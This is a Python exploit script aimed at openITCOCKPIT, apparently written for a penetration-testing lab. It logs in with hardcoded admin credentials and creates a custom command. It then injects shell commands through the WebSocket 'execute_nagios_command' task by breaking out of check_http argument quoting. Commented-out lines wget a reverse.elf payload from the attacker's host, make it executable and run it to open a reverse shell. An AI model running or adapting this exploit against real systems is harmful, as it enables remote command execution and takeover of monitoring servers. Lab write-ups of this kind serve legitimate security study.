import websocket
import ssl
import json
import argparse
import os
import requests
import _thread as thread # To allow for execution of tasks in background
requests.packages.urllib3.disable_warnings()

uniqid = ""
key = ""
cmd = ""
count = 0
LHOST = ""
LPORT = 0

def toJson(task,data):
	req = {
		"task": task,
		"data": data,
		"uniqid": uniqid,
		"key": key
	}
	return json.dumps(req)

def on_open(ws):
	global cmd, count, LHOST
	count = 0
	print("[+] Connection Open")
	def run():
		wrappedCmd = f'./check_http -I {LHOST} -p 80 -k \'test1 -c \'{cmd}'
		print(wrappedCmd)
		ws.send(toJson("execute_nagios_command", wrappedCmd))
	thread.start_new_thread(run, ())

def on_message(ws, message):
	global uniqid, count
	mes = json.loads(message)
	if "uniqid" in mes.keys():
		uniqid = mes["uniqid"]
	
	if mes['type'] == 'connection':
		print("[+] Connection Open")
	elif mes['type'] == 'dispatcher':
		pass
	elif mes['type'] == 'response':
		print()
		print(mes["payload"])
	else:
		print()
		print("Message: ", mes)

	# Kill after 3 rounds
	count += 1
	if count == 3:
		ws.keep_running=False

def on_error(ws, error):
	print()
	print("Error: ", error)

def on_close(ws, close_status_code, close_msg):
	print()
	print("[+] Connection Closed")
	print(close_msg)

def run_webSocket(c):
	global cmd
	cmd = c
	ws = websocket.WebSocketApp(args.url,
		on_message = on_message,
		on_error= on_error,
		on_close = on_close,
		on_open = on_open
	)
	ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

def login(ip, username, password):
	s = requests.Session()

	proxies = {
		'http': 'http://127.0.0.1:8080',
		'https': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	target = f"https://{ip}/login/login"
	s.get(target, verify=False)
	target = f"https://{ip}/login/login"
	data = {
		"_method": "POST",
		"data[LoginUser][username]": username,
		"data[LoginUser][password]": password,
		"data[LoginUser][remember_me]": 0
	}

	r = s.post(target,data=data,verify=False)
	if "Istrator" not in r.text:
		print("Admin login unsuccessful")
		exit(0)
	print("Login Successful")
	return s

def create_command(ip, s, name, cmd):
	print("Creating custom command")
	target = f"https://{ip}/commands/add"
	r = s.get(target,verify=False)

	data = {
		"_method":"POST",
		"data[Command][command_type]":1,
		"data[Command][name]":name,
		"data[Command][command_line]":cmd,
		"data[Command][description]":"placeholder"
	}
	r = s.post(target,data=data,verify=False)

def main(args):
	global key
	key = args.key
	url = args.url
	websocket.enableTrace(args.verbose)

	ip = "openitcockpit"
	print("This exploit is an administrator exploit. Modify the database to set the admin password to be equal to that of the viewer password.")
	s = login(ip, username="admin@admin.local", password="27NZDLgfnY")

	create_command(
		ip,
		s,
		"testCommand",
		"ping -c 4 192.168.45.239",
	)

	# cmd1 = f"wget http://{LHOST}:8000/reverse.elf -O /tmp/reverse.elf"
	# cmd2 = "chmod +x /tmp/reverse.elf"
	# cmd3 = "/tmp/reverse.elf"
	# run_webSocket(cmd1)
	# run_webSocket(cmd2)
	# run_webSocket(cmd3)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', '-u', required=True, dest='url', help='Websocket URL')
	parser.add_argument('--key', '-k', required=True, dest='key', help='openITCOCKPIT key')
	parser.add_argument('--verbose', '-v', help='Print more data', action='store_true')
	args = parser.parse_args()

	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	
	main(args)
